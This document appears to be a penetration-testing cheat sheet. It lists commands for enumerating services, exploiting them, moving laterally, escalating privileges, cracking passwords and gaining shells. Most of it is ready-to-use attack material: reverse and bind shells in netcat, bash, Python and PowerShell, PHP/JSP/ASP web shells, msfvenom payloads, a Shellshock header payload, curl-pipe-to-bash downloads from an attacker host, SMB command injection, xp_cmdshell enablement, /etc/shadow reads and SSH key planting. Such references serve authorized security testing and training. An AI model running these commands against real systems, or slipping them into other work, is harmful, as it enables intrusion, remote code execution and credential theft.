# Penetration Testing

Overview
---------
1. - [Passive Enumeration](#1---passive-enumeration)
2. - [Active Enumeration](#2---active-enumeration)
3. - [Exploitation](#3---exploitation)
4. - [Lateral Movement](#4---lateral-movement)
5. - [Privilege Escalation](#5---privilege-escalation)
6. - [Brute Force](#6---brute-force)
7. - [File Transfers](#7---file-transfers)
8. - [Restricted Shell Escapes](#8---restricted-shell-escapes)
9. - [Shells](#9---shells)
10. - [Online Resources](#10---online-resources)
11. - [Browser Plugins](#11---browser-plugins)
12. - [Exploits](#12---exploits)
13. - [Exploit Research](#13---exploit-research)
   
#1. - Passive Enumeration
-----------------------------------------

- Searchcode

```
https://searchcode.com/
```

- Shodan

```
https://www.shodan.io/
$ for i in $(cat ip-addresses.txt);do shodan host $i;done	
```

- Certificate Search

```
https://crt.sh/
$ curl -s https://crt.sh/\?q\=<Target Domain Name>\&output\=json | jq .
$ curl -s https://crt.sh/\?q\=<Target Domain Name>\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
```

- Google Dorks

```
intext:<company name> inurl:amazonaws.com
intext:<company name> inurl:blob.core.windows.net
```

- Whois

```
https://domain.glass/
```

- Cloud Bucket Search

```
https://buckets.grayhatwarfare.com/
```
     
#2. - Active Enumeration
-----------------------------------------

- Nmap

```
$ nmap -sn <IP address>
$ nmap -sC -sV -p- -Pn -A <IP address>
$ nmap -sC -sV -p- -Pn -A -sU <IP address>
$ nmap --top-ports=100 <IP address>
$ nmap <IP address> --script vuln
$ nmap -sV <IP address> --script banner
$ nmap -sV <IP address> --packet-trace	--reason
$ nmap <IP address> -S <Spoofed IP address> -e tun0
$ nmap <IP address> -D RND:5
$ nmap <IP address> --source-port <Spoofed port>
$ nmap <IP address> -oA scan
$ xsltproc target.xml -o target.html
```

- Netcat

```
$ nc -nv <IP address> <port>
```

- FTP (port 21)

```
$ ftp <IP address> (anonymous:anonymous)
ftp> dir
ftp> cd <folder>
ftp> get <file>
ftp> put <file>
ftp> exit
$ openssl s_client -connect <IP address>:21 -starttls ftp
$ wget -m --no-passive ftp://anonymous:anonymous@<IP address>
```

- SSH (port 22)

```
$ ssh <user>@<IP address>
$ ssh <user>@<IP address> -p <port>
$ ssh -i id_rsa <user>@<IP address>
$ ssh <user>@<IP address> -o PreferredAuthentications=password
$ ssh-audit.py <IP address>
```

- Telnet (port 23)

```
$ telnet <IP address>
```

- SMTP (port 25)

```
$ telnet <IP address> 25
```

- DNS (udp/port 53)

```
$ dig ns <domain.tld> @<nameserver>
$ dig any <domain.tld> @<nameserver>
$ dig axfr <domain.tld> @<nameserver>
$ dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>
$ for i in $(cat subdomainlist.txt);do host $i | grep "has address" | grep <Target Domain Name> | cut -d" " -f4 >> ip-addresses.txt;done
```

- TFTP (udp/port 69)

```
$ tftp <IP address>
tftp> get <file>
tftp> put <file>
```

- HTTP/HTTPS (port 80/443)

```
Right-Click -> View Page Source
https://<URL>/robots.txt
$ gobuster dir -w <wordlist> -u <URL>
$ gobuster dir -w <wordlist> -u <URL> -x php,html
$ gobuster vhost -w <wordlist> -u <URL>
$ gobuster dns -w <wordlist> -d <Domain Name>
$ ffuf -u <URL>/FUZZ -w <wordlist>
$ curl -IL <URL>
$ curl <URL> -H 'User-agent: zerodiumsystem("curl <IP address>");'
$ curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/<IP address>/443 0>&1" http://<IP address>/cgi-bin/user.sh
$ feroxbuster -w <wordlist> -u <URL>
$ wfuzz -c -w <wordlist> -u http://FUZZ.<domain>
$ nikto -h <IP address>
$ eyewitness -f <URL list.txt> --web
$ whatweb <IP address>
$ curl -v -X OPTIONS <IP address>
$ curl http://<IP address> --upload-file test.txt
$ curl -X PUT http://<IP address>/test.txt -d @test.txt
$ curl -X PUT http://<IP address>/test.txt --data-binary @cmdasp.aspx 
$ curl -X PUT http://<IP address>/test.txt -d @cmdasp.aspx 
$ curl -X MOVE -H 'Destination:http://<IP address>/cmdasp.aspx' http://<IP address>/test.txt
$ davtest -url http://<IP address>
$ cadaver http://<IP address>
dav:/ put cmdasp.aspx cmdasp.txt
dav:/ put cmdasp.txt cmdasp.aspx
```

- MSRPC (port 135)

```
$ wmiexec.py <user>:"<password>"@<IP address> "<command>"	
```

- SMB (port 137/139/445)

```
$ smbclient -L <IP address>
$ smbclient -L <IP address> -U <username>
$ smbclient \\\\<IP address>\\c$
$ smbclient \\\\<IP address>\\c$ -U <username>
$ smbmap -H <IP address>
$ smbmap -H <IP address> -u <username> -p <password>
smb: \> logon "/=`nc <IP address> <port> -e /bin/sh`"
$ rpcclient -U "" <IP address>
$ for i in $(seq 500 1100);do rpcclient -N -U "" <IP address> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
$ samrdump.py <IP address>	
msf> use auxiliary/scanner/smb/smb_version
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> use exploit/windows/smb/ms08_067_netapi
msf> use exploit/multi/samba/usermap_script
$ enum4linux -a <IP address>
$ enum4linux-ng.py -A <IP address>
$ crackmapexec smb <IP address> --shares
$ crackmapexec smb <IP address> --shares -u '' -p ''
$ crackmapexec smb <IP address> --shares -u <username> -p '<password>'
$ crackmapexec winrm <IP address> -u <username> -p '<password>'
```

- SNMP (udp/port 161)

```
$ snmpwalk -v 2c -c <community string> <IP address>
$ snmpwalk -v 2c -c public <IP address> 1.3.6.1.2.1.1.5.0
$ snmpwalk -v 2c -c private <IP address> 1.3.6.1.2.1.1.5.0
$ onesixtyone -c dict.txt <IP address>
$ braa <community string>@<IP address>:.1.*
```

- IPMI (udp/port 623)

```
msf> use auxiliary(scanner/ipmi/ipmi_version)
msf> use auxiliary(scanner/ipmi/ipmi_dumphashes)	
```

- CUPS (port 631)

```
$ cupsctl ErrorLog="/etc/shadow"
$ curl http://<IP address>:631/admin/log/error_log?
use multi/escalate/cups_root_file_read
```

- Rsync (port 873)

```
$ rsync --list-only <IP address>::
$ rsync --list-only <IP address>::<share>
$ rsync <IP address>::<share>/<filename> <filename>
```

- IMAPS (port 993)

```
$ curl -k 'imaps://<IP address>' --user <user>:<password>
$ openssl s_client -connect <IP address>:imaps
```

- POP3S (port 995)

```
$ openssl s_client -connect <IP address>:pop3s
```

- MSSQL (port 1433)

```
$ python3 mssqlclient.py <domain>/<username>@<IP address> -windows-auth
SQL> SELECT is_srvrolemember('sysadmin');
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell "whoami";
```

- Oracle TNS (port 1521)

```
$ ./odat.py all -s <IP address>
$ ./odat.py utlfile -s <IP address> -d <database> -U <user> -P <password> --sysdba --putFile <file path> <output file path>
$ sqlplus <user>/<password>@<IP address>/<database>	
```

- NFS (port 2049)

```
$ showmount -e <IP address>
$ sudo mount -t nfs <IP address>:<mountable share> <target location> -o nolock
$ sudo umount <target location>
$ sudo useradd -u <UID> <user>
```

- MySQL (port 3306)

```
$ mysql -h <IP address> -u root
MariaDB [(none)]> SHOW databases;
MariaDB [(none)]> USE <database name>;
MariaDB [(none)]> SHOW tables;
MariaDB [(none)]> SELECT * FROM <table name>;
```

- RDP (port 3389)

```
$ xfreerdp /v:<IP address>
$ xfreerdp /v:<IP address> /u:Administrator
$ freerdp /v:<IP address> /cert:ignore /u:Administrator
$ rdp-sec-check.pl <IP address>
```

- PostgreSQL (port 5432)

```
$ psql -h <IP address> -U <username> -p <password>
<username>=# \l
<username>=# \c secrets
<username>=# \dt
<username>=# SELECT * FROM <table>;
```

- WinRM (port 5985)

```
$ evil-winrm -i <IP address> -u <username> -p <password>
```

- X11 (port 6000)

```
$ cat .Xauthority | base64
$ echo AQAADHN<...SNIP...>S0xAoNm/oZZ4/ | base64 -d > /tmp/.Xauthority
$ export XAUTHORITY=/tmp/.Xauthority
$ w
$ xwd -root -screen -silent -display :0 > /tmp/screen.xwd
$ convert screen.xwd screen.png
```

- Redis (port 6379)

```
$ redis-cli -h <IP address>
<IP address>:6379> select <db number e.g. 0>
<IP address>:6379> keys *
<IP address>:6379> get <key>
```

- MongoDB (port 27017/27117)

```
$ ./mongo mongodb://<IP address>:27017
> show dbs;
> use <db name>;
> show collections;
> db.<collection>.find().pretty();
$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
$ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("<Object ID>")},{$set:{"x_shadow":"<SHA-512 hash>"}})'
```

#3. - Exploitation
-----------------------------------------

- Searchsploit

```
$ searchsploit <term>
```

- Metasploit

```
$ msfconsole
msf6 > search exploit eternalblue
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 exploit(windows/smb/ms17_010_psexec) > info
msf6 exploit(windows/smb/ms17_010_psexec) > options
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS <IP address>
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
msf6 exploit(windows/smb/ms17_010_psexec) > check
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
```

- Local File Inclusion (LFI)

```
http://<domain name>/<page>?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

- Remote File Inclusion (RFI)

```
sudo responder -I <network interface>
http://<domain name>/<page>?page=//<IP address>/somefile
```

- Server Side Template Injection (SSTI)

```
${7*7}
```

- Insecure Direct Object Reference (IDOR)

```
http://<IP address>/data/0
http://<IP address>/data/1
http://<IP address>/data/2
```

- Webshell

```
http://<domain name>/shell.php?cmd=id
http://<domain name>/shell.php?cmd=curl%20<IP address>:8000/shell.sh|bash
```

- Sqlmap

```
$ sqlmap -u '<URL>' --cookie="PHPSESSID=<PHPSESSID>"
$ sqlmap -u '<URL>' --cookie="PHPSESSID=<PHPSESSID>" --os-shell
```

- Rogue-JNDI

```
$ java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<base64 payload>} | {base64,-d}|{bash,-i}" --hostname "<IP address>"
```

- Tomcat

```
http://<IP address>:<port>/manager/html
tomcat:s3cret
use exploit/multi/http/tomcat_mgr_upload
```

- PRTG Network Monitor

```
C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.dat
https://github.com/shk0x/PRTG-Network-Monitor-RCE/blob/master/prtg-exploit.sh
use exploit/windows/http/prtg_authenticated_rce
```

#4. - Lateral Movement
-----------------------------------------

- Local Port Forwarding

```
$ ssh -L 1234:localhost:5432 <username>@<remote IP address>
```

- Dynamic Port Forwarding

```
$ ssh -D 1234 <username>@<remote IP address>
```

- Proxychains

```
Edit /etc/proxychains4.conf
$ proxychains <command>
```

- Chisel

```
https://github.com/jpillora/chisel
$ sudo ./chisel server -p 8000 --reverse
$ ./chisel client <IP address>:8000 R:631:127.0.0.1:631
```

- Socat

```
$ socat tcp-listen:9090,fork tcp:127.0.0.1:631 &
```

- Meterpreter

```
meterpreter> portfwd add -l 8082 -p 631 -r 127.0.0.1
```

- PsExec

```
$ python psexec.py <username>:<password>@<IP address>
$ python psexec.py <username>@<IP address>
```

#5. - Privilege Escalation
-----------------------------------------

- Sudo

```
$ sudo -l
$ sudo -u <user> /bin/bash
```

- SUID

```
https://github.com/Anon-Exploiter/SUID3NUM
```

- WinPEAS

```
https://github.com/carlospolop/PEASS-ng
```

- LinPEAS

```
https://github.com/carlospolop/PEASS-ng
```

- LinEnum

```
https://github.com/rebootuser/LinEnum
```

- Linuxprivchecker

```
https://github.com/sleventyeleven/linuxprivchecker
```

- Capabilities

```
$ getcap -r / 2>/dev/null
CAP_SETUID
```

- Python

```
>>> import os
>>> os.setuid(0)
>>> os.system("/bin/bash")
$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

- Seatbelt

```
https://github.com/GhostPack/Seatbelt
```

- JAWS

```
https://github.com/411Hall/JAWS
```

- Weak Service

```
C:\> sc.exe config <service> binPath=C:\Windows\Temp\nc.exe -e cmd.exe <IP address> <port>"
C:\> sc.exe stop <service>
C:\> sc.exe start <service>
```

- Cron Jobs

```
$ ls /etc/crontab
$ ls /etc/cron.d
$ ls /var/spool/cron/crontabs/root
```

- Vulnerable Software

```
$ dpkg -l
C:\> dir "C:\Program Files"
C:\> dir "C:\Program Files (x86)"
```

- Exposed Credentials

```
$ cat .bash_history
PS C:\> Get-Content (Get-PSReadlineOption).HistorySavePath
```

- SSH Key Login

```
$ cat /home/user/.ssh/id_rsa
$ cat /root/.ssh/id_rsa
$ chmod 600 id_rsa
$  ssh <user>@<IP address> -i id_rsa
```

- SSH Authorized Keys

```
$ ssh-keygen -f key
$ cat key.pub
$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
$ ssh <user>@<IP address> -i key
```

- Whoami

```
C:\> whoami /priv
```

- Windows Exploit Suggester

```
https://github.com/AonCyberLabs/Windows-Exploit-Suggester
(On Kali) $ ./windows-exploit-suggester.py --update
$ install python-xlrd
$ pip install xlrd --upgrade

feed it "systeminfo" input, and point it to the microsoft database
$ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
```

- Metasploit

```
msf> use post/multi/recon/local_exploit_suggester
```

#6. - Brute Force
-----------------------------------------

- HashID

```
$ hashid <hash>
```

- John The Ripper

```
$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
$ john --show hashes.txt
```

- Hydra

```
$ hydra -L <usernames.txt> -p '<password>' <IP address> ssh
```

- Zip2john

```
$ zip2john <ZIP file> > hashes.txt
```

- Hashcat

```
$ hashcat -a 0 -m 0 hashes.txt <wordlist>
```

#7. - File Transfers
-----------------------------------------

- Host Files

```
$ nc -nlvp 443 < file.txt
$ python -m SimpleHTTPServer 80
$ python3 -m http.server 8000
$ smbserver.py a /usr/share/windows-binaries/
```

- Download Files

```
$ nc -nv <IP address> 443 > file.txt
$ wget http://<IP address>:8000/exploit.sh
$ curl http://<IP address>:8000/exploit.sh -o exploit.sh
$ curl http://<IP address>:8000/exploit.sh | bash
$ scp exploit.sh <user>@<IP address>:/tmp/exploit.sh
C:\> copy \\<IP address>\a\whoami.exe C:\Windows\Temp\whoami.exe
C:\> powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<IP address>/exploit.exe','C:\Users\Offsec\Desktop\new-exploit.exe')"
```

#8. - Restricted Shell Escapes
-----------------------------------------

- Shell Escapes

```
$ bash -i
$ echo os.system('/bin/bash')
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ script /dev/null -c bash
```

- Tab Auto Completion

```
$ CTRL+Z
$ stty raw -echo
$ fg
$ reset
$ export TERM=xterm-256color
$ stty rows 67 columns 318
```

#9. - Shells
-----------------------------------------

- Bind Shells

```
$ nc -nlvp <port> -e /bin/bash
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
$ python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("<IP address>",<port>));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
$ powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();

```

- Reverse Shells

```
$ nc -nv <IP address> <port> -e /bin/bash
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP address> <port> >/tmp/f
$ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
$ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP address>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
$ socat file:`tty`,raw,echo=0 tcp-listen:4444
$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP address>:4444
msf> use exploit/multi/handler
```

- Web Shells

```
PHP: <?php system($_REQUEST["cmd"]); ?>
JSP: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
ASP: <% eval request("cmd") %>
```

- Default Webroot Locations

```
Apache: /var/www/html/
Nginx: /usr/local/nginx/html/
IIS: c:\inetpub\wwwroot\
XAMPP: C:\xampp\htdocs\
```

- MSFvenom

```
http://pentestmonkey.net/tools/web-shells/php-reverse-shell
Edit IP address and port

$ msfvenom -p php/reverse_php LHOST=<IP address> LPORT=<Port> -f raw > shell.php
$ msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP address> LPORT=<Port> -f raw > shell.php
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> -f asp > shell.asp
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> -f aspx > shell.aspx
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f war > shell.war
$ msfvenom -p windows/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f exe -o shell.exe
```

#10. - Online Resources
-----------------------------------------

- Speedguide

```
https://www.speedguide.net/port.php?port=3389
```

- CrackStation

```
https://crackstation.net/
```

- Living Off The Land Binaries, Scripts and Libraries (LOLBAS)

```
https://lolbas-project.github.io/
```

- GTFOBins

```
https://gtfobins.github.io/
```

#11. - Browser Plugins
-----------------------------------------

- Wappalyzer: Website technology analyser

```
https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
```

- Cookie Editor: edit cookies

```
https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
```

- FoxyProxy: proxy management

```
https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
```

#12. - Exploits
-----------------------------------------

- MS17-010

```
https://github.com/worawit/MS17-010/blob/master/zzz_exploit.py
$ ./zzz_exploit.py <IP address> ntsvcs
https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py
https://github.com/3ndG4me/AutoBlue-MS17-010
```

- MS08-067

```
https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py
```

- CVE-2007-2447

```
https://github.com/amriunix/CVE-2007-2447
```

- PHP 8.1.0-dev Backdoor Remote Code Execution

```
https://github.com/flast101/php-8.1.0-dev-backdoor-rce
```

- CVE-2021-4034

```
https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py
```

#13. - Exploit Research
-----------------------------------------

- CVEdetails

```
https://www.cvedetails.com/
```

- Exploit DB

```
https://www.exploit-db.com/
```

- Vulners

```
https://vulners.com/
```

- Rapid7

```
https://www.rapid7.com/db/
```

- Vulnerability Lab

```
https://www.vulnerability-lab.com/
```

- Packet Storm Security

```
https://packetstormsecurity.com/
```

- NIST

```
https://nvd.nist.gov/vuln/search?execution=e2s1
```
